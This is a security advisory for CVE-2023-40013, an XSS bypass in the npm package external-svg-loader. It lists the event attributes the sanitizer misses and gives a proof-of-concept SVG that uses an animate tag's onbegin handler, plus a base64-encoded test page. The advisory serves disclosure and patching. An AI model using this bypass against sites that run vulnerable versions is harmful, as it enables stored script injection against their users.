# [C] external-svg-loader Cross-site Scripting vulnerability

## Summary
Severity: Critical
Advisory: GHSA-xc2r-jf2x-gjr8
CVE: CVE-2023-40013
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-08-14
Source: https://github.com/advisories/GHSA-xc2r-jf2x-gjr8
Type: github-advisory

## Affected
- npm: `external-svg-loader` — affected >=0 <1.6.9

## Details
### Summary
According to the [docs](https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript), svg-loader will strip all JS code before injecting the SVG file for security reasons but the input sanitization logic is not sufficient and can be trivially bypassed. This allows an attacker to craft a malicious SVG which can result in XSS. 

### Details
When trying to sanitize the svg the lib [removes event attributes](https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128) such as `onmouseover`, `onclick` but the list of events is not exhaustive. Here's a list of events not removed by svg-loader. 
`onafterscriptexecute, onbeforecopy, onbeforecut, onbeforescriptexecute, onbeforetoggle, onbegin, onbounce, onend, onfinish, onfocusin, onfocusout, onmousewheel, onpointerrawupdate, onrepeat, onsearch, onshow, onstart, ontoggle(popover), ontouchend, ontouchmove, ontouchstart`
As you can see in the POC we can use `onbegin` in `animate` tag to execute JS code without needing to add `data-js="enabled"`.

### PoC

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <animate onbegin=alert(1) attributeName=x dur=1s>
</svg>

```

```html
<html>
    <head>
        <script src="./dist/svg-loader.js" type="text/javascript"></script>
    </head>
    <body>
        <svg data-src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICA8YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eCBkdXI9MXM+Cjwvc3ZnPgo="></svg>
    </body>
</html>

```

### Impact
Any website which uses external-svg-loader and allows its users to provide svg src, upload svg files would be susceptible to stored XSS attack.

## References
- https://github.com/shubhamjain/svg-loader/security/advisories/GHSA-xc2r-jf2x-gjr8
- https://nvd.nist.gov/vuln/detail/CVE-2023-40013
- https://github.com/shubhamjain/svg-loader/commit/d3562fc08497aec5f33eb82017fa1417b3319e2c
- https://github.com/shubhamjain/svg-loader
- https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128
- https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript
